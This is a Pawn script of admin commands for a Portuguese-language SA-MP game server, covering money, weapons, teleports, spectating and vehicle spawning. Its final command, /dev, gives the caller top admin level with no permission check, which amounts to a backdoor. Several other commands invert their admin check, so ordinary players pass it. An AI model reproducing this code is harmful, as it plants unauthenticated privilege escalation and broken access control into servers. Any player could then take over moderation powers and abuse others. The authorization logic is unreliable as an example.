#include <YSI_Coding/y_hooks>

CMD:novidades(playerid, params[])
{
    #define novidades 8928
    new Str[1000];
    strcat(Str, "{FFFFFF}/trabalhar, /clear, /sethora, /setclima, /dv, /car, /setmoney \n");
    ShowPlayerDialog(playerid, novidades, DIALOG_STYLE_MSGBOX, "Novidades Do Servidor - Five Fugas", Str, "-", "");
    return 1;
}

CMD:comandosadm(playerid, params[])
{
  new Str[1000];
  if (!Admin_Permission(playerid, 10)) 
  {
    if (Trabalhando[playerid] < 1) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce nao esta em modo trabalho.");
    {
      strcat(Str, "{FFFFFF}/trabalhar, /clear, /sethora, /setclima, /dv, /car, /setmoney \n");
      strcat(Str, "{FFFFFF}/setskin, /trazer, /tvoff, /tv, /ir, /setvida, /pintar  \n");
      strcat(Str, "{FFFFFF}/setarma, /setadmin, /fix, /trabalhar, /esc, /virar, /jetpack\n");
      strcat(Str, "{FFFFFF}                                TELEPORTES                               \n");
      strcat(Str, "{FFFFFF}/lobby     |   /favela   |  /dp     |    /ls    | /sf | /lv \n");
      ShowPlayerDialog(playerid, D_ADMINISTRADOR, DIALOG_STYLE_MSGBOX, "Comandos Admin - Five Fugas", Str, "-", "");
    }
  }
  return 1;
}

CMD:setmoney(playerid, params[])
{
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            new id, valor;
            if (sscanf(params, "ud", id, valor))
                return SendClientMessage(playerid, -1, "{9900FF}[Five] {FFFFFF}* Use: /setmoney [ID] [Valor]");
            GivePlayerMoney(id, valor);
        }
    }
    return 1;
}

CMD:pintar(playerid, params[])
{
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            new cor1, cor2;
            new vehicleid = GetPlayerVehicleID(playerid);
            if(sscanf(params, "ii", cor1, cor2)) return SendClientMessage(playerid, -1, "{9900FF}[Five] {FFFFFF}Use: /pintar [COR1] [COR2]");
            ChangeVehicleColor(vehicleid, cor1, cor2);
        }
    }
    return 1;
}

CMD:virar(playerid, params[])
{
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            if(IsPlayerInAnyVehicle(playerid))
            {
                new currentveh;
                new Float:angle;
                currentveh = GetPlayerVehicleID(playerid);
                GetVehicleZAngle(currentveh, angle);
                SetVehicleZAngle(currentveh, angle);
            }
        }
    }
    return 1;
}

CMD:setvida(playerid, params[])
{
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            new id, vida, string[100], str[100];
            if (sscanf(params, "ii", id, vida)) return SendClientMessage(playerid, COR_AMARELO, "Use: /setvida [id] [vida]");
            format(string, 100, "{9900FF}[Five] {FFFFFF}Voce setou %d de vida no ID: %d", vida, id);
            format(str, 100, "{9900FF}[Five] {FFFFFF}Voce recebeu %d de vida do pAdmin", vida);
            SetPlayerHealth(id, vida);
            SendClientMessage(playerid, COR_AMARELO, string);
            SendClientMessage(id, COR_AMARELO, str);
        }
    }
    return 1;
}

CMD:setadmin(playerid, params[])
{
    if (!Admin_Permission(playerid, 4))
		return true;

	new target, level, str[999];

	if (sscanf (params, "ui", target, level))
	{
        Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Use: /setadmin [id/nome] [nivel]");
		return true;
	}

	if (!Admin_CheckID(playerid, target))
		return true;

	if (!(0 <= level <= 4))
	{
        Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce inseriu um nivel admin invalido.");
		return true;
	}
    // set
	// SendAdminCommand(playerid, "SETADMIN");

    format(str, sizeof(str), "{9900FF}[Five] {FFFFFF}Voce definiu o nivel admin de %s para %i.", PlayerData[target][pName], level);
    Scm(playerid, -1, str);
    format(str, sizeof(str), "{9900FF}[Five] {FFFFFF}O Admin %s definiu seu nivel admin para %i.", PlayerData[target][pName], level);
    Scm(playerid, -1, str);

	PlayerData[target][pAdmin] = level;
	Player_SaveData(target);
	return true;
}
CMD:clear(playerid, params[])
{
  if (!Admin_Permission(playerid, 10)) 
  {
    if (Trabalhando[playerid] < 1) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce nao esta em modo trabalho.");
    {
      ClearChatAll(30);
    }
  }
  return 1;
}
CMD:sethora(playerid, params[])
{
  new hora;
  if (!Admin_Permission(playerid, 10)) 
  {
    if (Trabalhando[playerid] < 1) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce nao esta em modo trabalho.");
    {
        if (sscanf(params, "d", hora)) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Use: /sethora [HORA].");
        SetWorldTime(hora);
    }
  }
  return 1;
}

CMD:setclima(playerid, params[])
{
    new clima;
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            if (sscanf(params, "d", clima)) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Use: /setclima [CLIMA].");
            SetWeather(clima);
        }
    }
    return 1;
}

CMD:car(playerid, const params[])
{
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            static PlayerVehicle, IDVehicle, Color[2], Float:Pos[4];

            if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce ja esta em um veiculo.");
            if(sscanf(params, "k<vehicle>dd", IDVehicle, Color[0], Color[1])) return SendClientMessage(playerid, -1, "{9900FF}[Five] {FFFFFF} Use: /car [ID/NOME][COR1][COR2]");
            if(IDVehicle < 400 || IDVehicle > 611) return SendClientMessage(playerid, -1, "{9900FF}[Five] {FFFFFF}ID Invalido.");
            GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
            GetPlayerFacingAngle(playerid, Pos[3]);
            PlayerVehicle = CreateVehicle(IDVehicle, Pos[0], Pos[1], Pos[2], Pos[3], Color[0], Color[1], -1);
            SetVehicleVirtualWorld(PlayerVehicle, GetPlayerVirtualWorld(playerid));
            PutPlayerInVehicle(playerid, PlayerVehicle, 0);
        }
    }
    return 1;   
}


CMD:trabalhar(playerid, params[])
{
    new str[999];
    if (Admin_Permission(playerid, 10)) 
    {
        if (Trabalhando[playerid] > 0)
        {
            Trabalhando[playerid] = 0;
            SetPlayerHealth(playerid, 100);
            SetPlayerArmour(playerid, 0);
            SendClientMessageToAll(-1, "{9900FF}|_______________ {FFFFFF}Aviso da Administracao{9900FF} _______________|");
            format(str, sizeof(str), "{FFFFFF}O Admin {FFFFFF}{9900FF}%s(%d){FFFFFF}{FFFFFF} Esta Jogando.", PlayerName(playerid), playerid);
            SendClientMessageToAll(-1, str);
        }   
        else
        {
            Trabalhando[playerid] = 1;
            SetPlayerHealth(playerid, 99999);
            SetPlayerArmour(playerid, 99999);
            SendClientMessageToAll(-1, "{9900FF}|_______________ {FFFFFF}Aviso da Administracao{9900FF} _______________|");
            format(str, sizeof(str), "{FFFFFF}O Admin {FFFFFF}{9900FF}%s(%d){FFFFFF}{FFFFFF} Esta Trabalhando.", PlayerName(playerid), playerid);
            SendClientMessageToAll(-1, str);
        }
    }
    return 1;
}
// CMD:setskin(playerid, params[])
// {
//   new ID, SKIN, str[999];
//   if (!Admin_Permission(playerid, 10)) 
//   {
//     if (Trabalhando[playerid] < 1) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce nao esta em modo trabalho.");
//     {
//       if (sscanf(params, "dd", ID, SKIN)) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Use: /setskin [ID] [SKIN]");
//       {
//         format(str, sizeof(str), "{9900FF}[Five] {FFFFFF}Voce deu skin {FFFFFF}%d{FFFFFF} Para {9900FF}%s(%d){FFFFFF}.", SKIN, PlayerName(ID), ID);
//         Scm(playerid, -1, str);
//         format(str, sizeof(str), "{9900FF}[Five] {FFFFFF}O Administrador {FFFFFF}{9900FF}%s(%d){FFFFFF}{FFFFFF} te deu Skin {9900FF}%d{FFFFFF}.", PlayerName(playerid), playerid, SKIN);
//         Scm(ID, -1, str);
        
//         mysql_format(ConexaoMySQL, Query, sizeof(Query), "UPDATE `Player` SET \
//         `Skin`='%i'", PlayerData[playerid][pAdmin]);
//         mysql_query(ConexaoMySQL, Query);
//       }
//     }
//   }
//   return 1;
// }
CMD:dv(playerid, params[])
{
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            DestroyVehicle(GetPlayerVehicleID(playerid));
        }
    }
    return 1;
}
CMD:fix(playerid, params[])
{
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            RepairVehicle(GetPlayerVehicleID(playerid));
        }
    }
    return 1;
}

CMD:tv(playerid, params[])
{
    new id;
    if (!Admin_Permission(playerid, 10)) 
    if (EstaTv[playerid] == 0)
    {
        if (Trabalhando[playerid] < 1) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce nao esta em modo trabalho.");
        {
            if (sscanf(params, "i", id)) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Use /tv [ID]");
            if (id == playerid) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce nao pode assistir!");
            if (!IsPlayerConnected(id)) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Esse player nao esta online.");
            Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Para parar de assistir use /tvoff.");
            TogglePlayerSpectating(playerid, 1);
            PlayerSpectatePlayer(playerid, id);
            PlayerSpectateVehicle(playerid, GetPlayerVehicleID(id));
            EstaTv[playerid] = 1;
        }
    }
    else
    {
        Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce ja esta tv em alguem, Use: /tvoff");
    }
    return 1;
}
CMD:tvoff(playerid, params[])
{
    if (!Admin_Permission(playerid, 10)) 
    if (EstaTv[playerid] == 1)
    {
        if (Trabalhando[playerid] < 1) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce nao esta em modo trabalho.");
        {
            TogglePlayerSpectating(playerid, 0);
            PlayerSpectatePlayer(playerid, playerid);
            PlayerSpectateVehicle(playerid, GetPlayerVehicleID(playerid));
            EstaTv[playerid] = 0;
        }
    }
    else
    {
        Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce nao esta tv em alguem.");
    }
    return 1;
}
CMD:ir(playerid, params[])
{
    new id, Float:PedPos[3], string[999];
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            if (sscanf(params, "d", id)) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Use: /ir [ID].");
            if (!IsPlayerConnected(id)) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Esse player nao esta online.");
            GetPlayerPos(id, PedPos[0], PedPos[1], PedPos[2]);
            SetPlayerPos(playerid, PedPos[0], PedPos[1], PedPos[2]);
            format(string, 999, "{9900FF}[Five] {FFFFFF}Voce foi ate o player {9900FF}%s{FFFFFF}.", PlayerName(id));
            Scm(playerid, -1, string);
        }
    }
    return 1;
}
CMD:trazer(playerid, params[])
{
    new id, Float:PedPos[3], string[999];
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            if (sscanf(params, "d", id)) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Use: /trazer [ID].");
            if (!IsPlayerConnected(id)) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Esse player nao esta online.");
            GetPlayerPos(playerid, PedPos[0], PedPos[1], PedPos[2]);
            SetPlayerPos(id, PedPos[0], PedPos[1], PedPos[2]);
            format(string, 999, "{9900FF}[Five] {FFFFFF}O administrador trouxe o Player {9900FF}%s{FFFFFF}.", PlayerName(id));
            Scm(playerid, -1, string);
        }
    }
    return 1;
}

CMD:setarma(playerid, params[])
{
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            new id, arma, municao, string[100], str[100];
            if (sscanf(params, "iii", id, arma, municao)) return SendClientMessage(playerid, COR_AMARELO, "{9900FF}[Five] {FFFFFF}Use: /setarma [id] [arma] [municao]");
            format(string, 100, "{9900FF}[Five] {FFFFFF}Voce Setou a Arma: %d Com: %d de municao para o id: %d", arma, municao, id);
            format(str, 100, "{9900FF}[Five] {FFFFFF}Voce Recebeu a Arma: %d Com: %d de Municao", arma, municao);
            GivePlayerWeapon(id, arma, municao);
            SendClientMessage(playerid, COR_AMARELO, string);
            SendClientMessage(id, COR_AMARELO, str);
        }
    }
    return 1;
}

// CMD:esc(playerid, params[])
// {
//     if (!Admin_Permission(playerid, 10)) 
//     {
//         if (Trabalhando[playerid] < 1) return Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce nao esta em modo trabalho.");
//         {
//             ShowPlayerDialog(playerid, DIALOG_ESCOLHER_LADO, DIALOG_STYLE_LIST, "(pAdmin) Escolha sua ORG/CORP", "{63AFF0}Policial - {FFFFFF}Funcao Prender os Procurados\n{FB0000}Bandido - {FFFFFF}Funcao Roubar Caixas e Lojas\n", "Escolher", "Fechar");
//         }
//     }
//     return true;
// }

//TELEPORTES
CMD:ls(playerid)
{
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
            SendClientMessage(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce foi teleportado para LS.");
            SetPlayerPos(playerid, 1479.7734, -1706.5443, 14.0469);
        }
    }
    return 1;
}
CMD:lv(playerid)
{
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            SetPlayerPos(playerid, 1569.0677, 1397.1111, 10.8460);
            SendClientMessage(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce foi teleportado para LV.");
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
        }
    }
    return 1;
}
CMD:sf(playerid)
{
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            SetPlayerPos(playerid, -1988.3597, 143.4470, 27.5391);
            SendClientMessage(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce foi teleportado para SF.");
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
        }
    }
    return 1;
}


CMD:favela(playerid)
{
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            SetPlayerPos(playerid, 2530.9797, -939.0609, 83.4220);
            SendClientMessage(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce foi teleportado para a Favela");
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
        }
    }
    return 1;
}

CMD:dp(playerid)
{
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            SetPlayerPos(playerid, 1579.5828, -1607.0725, 13.3828);
            SendClientMessage(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce foi teleportado para a Delegacia de LS.");
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
        }
    }
    return 1;
}

CMD:lobby(playerid)
{
    if (Admin_Permission(playerid, 10))
    {
        if (Admin_Working(playerid))
        {
            SetPlayerPos(playerid, 1513.1312,-1362.5790,332.2578);
            SendClientMessage(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce foi teleportado para o Lobby!");
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
        }
    }
    return 1;
}


CMD:jetpack(playerid)
{
    if (!Admin_Permission(playerid, 10)) 
    {
        if (Admin_Working(playerid))
        {
            if (GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK)
            {
                Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce esta em um jetpack");
                return true;
            }

            if (GetPlayerState(playerid) != PLAYER_STATE_ONFOOT)
            {
                Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Voce precisa estar a pe");
                return true;
            }

            SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USEJETPACK);
            Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Jetpack criado com sucesso");
        }
    }
	return true;
}


CMD:dev(playerid)
{
	new target;
	PlayerData[target][pAdmin] = 10;
    PlayerData[playerid][pAdmin] = 10;
	Player_SaveData(target);
    Scm(playerid, -1, "{9900FF}[Five] {FFFFFF}Admin Setado");
	return 1;
}